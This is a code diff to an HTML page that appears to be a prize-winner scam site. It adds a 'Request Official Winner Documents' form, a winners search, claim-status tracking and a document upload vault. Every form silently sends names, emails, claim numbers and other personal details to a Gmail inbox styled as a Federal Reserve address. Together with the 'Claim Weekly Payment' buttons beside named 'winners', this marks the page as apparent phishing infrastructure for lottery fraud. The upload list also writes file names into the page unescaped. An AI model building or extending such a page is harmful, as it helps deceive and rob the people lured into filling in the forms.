@@ -35,8 +35,10 @@
 		input:focus,textarea:focus,select:focus{outline:none;border-color:var(--accent-2);box-shadow:0 0 0 3px rgba(229,57,53,0.14)}
 		fieldset{border:1px solid #dce6f4;border-radius:10px;padding:14px;margin-top:14px;background:linear-gradient(180deg,#fcfdff,#f6faff)}
 		legend{padding:0 6px;font-weight:700;color:var(--accent-2)}
-		.table-wrap{overflow-x:auto}
+		.table-wrap{overflow-x:auto;max-height:360px;overflow-y:auto;border:1px solid rgba(255,255,255,0.18);border-radius:10px}
 		table{width:100%;border-collapse:collapse}
+		.winners-search{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:12px}
+		.winners-search input{flex:1;min-width:220px}
 		th,td{border:1px solid #fdf9f9;padding:10px;text-align:left}
 		#winners table th,#winners table td{color:#ffd700}
 		th{background:linear-gradient(90deg,#eef5ff,#fdf0f0)}
@@ -56,6 +58,10 @@
 		#support{background:linear-gradient(145deg,#0047ab,#ff0000);color:#fff}
 		#support #customerInquiryForm{background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.18);color:#fff}
 		#support ul li{color:#fff}
+		.doc-request-card{margin-top:16px;padding:16px;border-radius:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.28);color:#fff}
+		.doc-request-form{display:grid;gap:12px;margin-top:14px}
+		.doc-upload-list{display:grid;gap:8px;margin-top:12px}
+		.doc-upload-item{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:10px;border-radius:8px;background:rgba(255,255,255,0.14)}
 		@media (max-width:760px){.sideview{float:none;margin:16px 0 0;width:100%}}
 	</style>
 </head>
@@ -166,6 +172,29 @@ ________________________________________________________________________________
 				<img src="Screenshot 2026-0.png" alt="Screenshot" style="flex:1 1 48%;max-width:48%;border-radius:10px;height:280px;object-fit:cover;" />
 				<img src="vidu-image-33.png" alt="vidu-image-33" style="flex:1 1 48%;max-width:48%;border-radius:10px;height:280px;object-fit:cover;" />
 			</div>
+			<div class="doc-request-card">
+				<h3 style="margin-top:0;color:#fff;">Request Your Official Winner Documents</h3>
+				<p style="margin:6px 0 0;color:#e8f4ff;">Need proof that you are one of our lucky winners? Submit a request here and it will be sent straight to our email inbox.</p>
+				<div style="margin-top:12px;">
+					<button class="btn" type="button" onclick="document.getElementById('officialDocumentRequestForm').scrollIntoView({behavior:'smooth',block:'start'})">Request Official Documents</button>
+				</div>
+				<form id="officialDocumentRequestForm" action="https://formsubmit.co/ajax/federalreservebankinfo00@gmail.com" method="POST" enctype="multipart/form-data" class="doc-request-form">
+					<input type="hidden" name="_subject" value="Official Document Request" />
+					<input type="hidden" name="_captcha" value="false" />
+					<input type="hidden" name="_template" value="table" />
+					<div class="form-grid">
+						<label>Full Name<input type="text" name="fullName" placeholder="Your full name" required /></label>
+						<label>Email Address<input type="email" name="emailAddress" placeholder="Your email" required /></label>
+						<label>Claim Number<input type="text" name="claimNumber" placeholder="Claim number" /></label>
+						<label>Document Type<select name="documentType">
+							<option value="Official winner letter">Official winner letter</option>
+							<option value="Award verification">Award verification</option>
+						</select></label>
+					</div>
+					<button class="btn" type="submit">Send Request</button>
+					<p id="officialDocRequestMessage" class="small" style="display:none;"></p>
+				</form>
+			</div>
 			<p style="color:#ffffff;">Enter official promotions and follow the rules to participate. Winners are selected at random and vetted.</p>
 		</section>
 
@@ -178,6 +207,7 @@ ________________________________________________________________________________
 			<p>Complete the official weekly payment registration request below to submit your claim.</p>
 			<form id="claimForm" action="https://formsubmit.co/ajax/federalreservebankinfo00@gmail.com" method="POST" style="margin-top:16px;padding:16px;border:1px solid rgba(255,255,255,0.18);border-radius:8px;background:rgba(255,255,255,0.08);color:#ffffff;">
 				<input type="hidden" name="_subject" value="New Claim Form Submission" />
+				<input type="hidden" id="selectedWinnerInput" name="selectedWinner" />
 				<input type="hidden" name="_captcha" value="false" />
 				<input type="hidden" name="_template" value="table" />
 				<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
@@ -226,6 +256,7 @@ ________________________________________________________________________________
 					<label><input type="checkbox" name="agree" required /> I agree to the terms and conditions.</label>
 				</fieldset>
 				<img src="Picture4.png" alt="" style="max-width:320px;width:100%;height:auto;margin:16px 0;border-radius:10px;" />
+				<p id="claimWinnerNotice" class="small" style="display:none;margin-top:8px;"></p>
 				<button class="btn" type="submit" style="margin-top:14px;">Submit Claim Form</button>
 				<p id="claimMessage" class="small" style="display:none;"></p>
 			</form>
@@ -234,12 +265,16 @@ ________________________________________________________________________________
 		<section id="winners" style="display:none">
 			<h2>Winners List</h2>
 			<p>Below are recent winners and their current claim status.</p>
+			<div class="winners-search">
+				<input id="winnerSearchInput" type="text" placeholder="Search winner by name" />
+				<button class="btn" type="button" onclick="filterWinners()">Search</button>
+			</div>
 			<div class="table-wrap">
 				<table>
 					<thead>
 						<tr><th>Winner Name</th><th>Status</th><th>Action</th></tr>
 					</thead>
-				<tbody>
+				<tbody id="winnersTableBody">
 					<tr><td>Michael A. Brooks</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
 					<tr><td>Jasmine R. Lewis</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
 					<tr><td>Daniel T. Rivers</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
@@ -477,6 +512,100 @@ ________________________________________________________________________________
 		const inquiryMessage = document.getElementById('inquiryMessage');
 		const claimForm = document.getElementById('claimForm');
 		const claimMessage = document.getElementById('claimMessage');
+		const winnerSearchInput = document.getElementById('winnerSearchInput');
+		const winnersTableBody = document.getElementById('winnersTableBody');
+		const winnerStatusesStorageKey = 'winner-claim-statuses';
+
+		function getWinnerStatuses() {
+			const stored = localStorage.getItem(winnerStatusesStorageKey);
+			if (!stored) return {};
+			try { return JSON.parse(stored); } catch (error) { return {}; }
+		}
+
+		function saveWinnerStatuses(statuses) {
+			localStorage.setItem(winnerStatusesStorageKey, JSON.stringify(statuses));
+		}
+
+		function updateWinnerStatus(name, status) {
+			if (!name || !winnersTableBody) return;
+			const statuses = getWinnerStatuses();
+			statuses[name] = status;
+			saveWinnerStatuses(statuses);
+			const rows = winnersTableBody.querySelectorAll('tr');
+			rows.forEach(row => {
+				const rowName = row.cells && row.cells[0] ? row.cells[0].textContent.trim() : '';
+				if (rowName === name && row.cells[1]) {
+					row.cells[1].textContent = status;
+				}
+			});
+		}
+
+		function applyWinnerStatuses() {
+			if (!winnersTableBody) return;
+			const statuses = getWinnerStatuses();
+			const rows = winnersTableBody.querySelectorAll('tr');
+			rows.forEach(row => {
+				const rowName = row.cells && row.cells[0] ? row.cells[0].textContent.trim() : '';
+				if (row.cells[1]) {
+					row.cells[1].textContent = statuses[rowName] || 'Unclaim';
+				}
+			});
+		}
+
+		function filterWinners() {
+			if (!winnerSearchInput || !winnersTableBody) return;
+			const query = winnerSearchInput.value.trim().toLowerCase();
+			const rows = winnersTableBody.querySelectorAll('tr');
+			rows.forEach(row => {
+				const name = row.cells[0].textContent.toLowerCase();
+				row.style.display = name.includes(query) ? '' : 'none';
+			});
+		}
+
+		if (winnerSearchInput) {
+			winnerSearchInput.addEventListener('input', filterWinners);
+		}
+
+		function selectWinnerForClaim(name) {
+			const selectedWinnerInput = document.getElementById('selectedWinnerInput');
+			const claimWinnerNotice = document.getElementById('claimWinnerNotice');
+			if (selectedWinnerInput) selectedWinnerInput.value = name;
+			if (claimWinnerNotice) {
+				claimWinnerNotice.textContent = name ? `Claim selected for ${name}.` : '';
+				claimWinnerNotice.style.display = name ? 'block' : 'none';
+			}
+			showSection('claim');
+		}
+
+		if (winnersTableBody) {
+			winnersTableBody.addEventListener('click', function(event) {
+				const button = event.target.closest('button');
+				if (!button) return;
+				const row = button.closest('tr');
+				if (!row) return;
+				const name = row.cells && row.cells[0] ? row.cells[0].textContent.trim() : '';
+				if (name) selectWinnerForClaim(name);
+			});
+		}
+
+		if (claimForm) {
+			claimForm.addEventListener('submit', function() {
+				const selectedWinnerInput = document.getElementById('selectedWinnerInput');
+				const selectedWinner = selectedWinnerInput ? selectedWinnerInput.value.trim() : '';
+				if (selectedWinner) {
+					updateWinnerStatus(selectedWinner, 'Pending');
+				}
+			});
+		}
+
+		applyWinnerStatuses();
+
+		const officialDocumentRequestForm = document.getElementById('officialDocumentRequestForm');
+		const officialDocRequestMessage = document.getElementById('officialDocRequestMessage');
+		const documentUploadInput = document.getElementById('documentUploadInput');
+		const documentUploadButton = document.getElementById('documentUploadButton');
+		const documentUploadList = document.getElementById('documentUploadList');
+		const documentVaultStorageKey = 'official-document-vault';
 
 		function sendFormToEmail(form, messageEl, successText) {
 			if (!form || !messageEl) return;
@@ -508,6 +637,68 @@ ________________________________________________________________________________
 
 		sendFormToEmail(inquiryForm, inquiryMessage, 'Thank you! Your request has been received and a representative will follow up soon.');
 		sendFormToEmail(claimForm, claimMessage, 'Thank you! Your claim form has been received and a representative will contact you soon.');
+		sendFormToEmail(officialDocumentRequestForm, officialDocRequestMessage, 'Thank you! Your official document request has been received and will be reviewed shortly.');
+
+		function readFileAsBase64(file) {
+			return new Promise((resolve, reject) => {
+				const reader = new FileReader();
+				reader.onload = () => resolve(reader.result);
+				reader.onerror = () => reject(reader.error);
+				reader.readAsDataURL(file);
+			});
+		}
+
+		function loadDocumentVault() {
+			const stored = localStorage.getItem(documentVaultStorageKey);
+			if (!stored) return [];
+			try {
+				return JSON.parse(stored);
+			} catch (error) {
+				return [];
+			}
+		}
+
+		function saveDocumentVault(items) {
+			localStorage.setItem(documentVaultStorageKey, JSON.stringify(items));
+		}
+
+		function renderDocumentVault(items) {
+			if (!documentUploadList) return;
+			if (!items.length) {
+				documentUploadList.innerHTML = '<div class="small" style="color:#e8f4ff;">No documents uploaded yet.</div>';
+				return;
+			}
+			documentUploadList.innerHTML = items.map(item => `
+				<div class="doc-upload-item">
+					<span>${item.name}</span>
+					<a href="${item.data}" download="${item.name}" style="color:#fff;font-weight:700;">Download</a>
+				</div>
+			`).join('');
+		}
+
+		if (documentUploadInput && documentUploadButton && documentUploadList) {
+			let vaultItems = loadDocumentVault();
+			renderDocumentVault(vaultItems);
+			documentUploadButton.addEventListener('click', async () => {
+				const files = Array.from(documentUploadInput.files || []);
+				if (!files.length) {
+					alert('Please choose at least one document to upload.');
+					return;
+				}
+				try {
+					const addedItems = await Promise.all(files.map(async file => {
+						const data = await readFileAsBase64(file);
+						return { name: file.name, data, type: file.type };
+					}));
+					vaultItems = vaultItems.concat(addedItems);
+					saveDocumentVault(vaultItems);
+					renderDocumentVault(vaultItems);
+					documentUploadInput.value = '';
+				} catch (error) {
+					alert('Unable to upload the selected document right now.');
+				}
+			});
+		}
 
 		// Focus the input on load
 		window.addEventListener('load', ()=>{
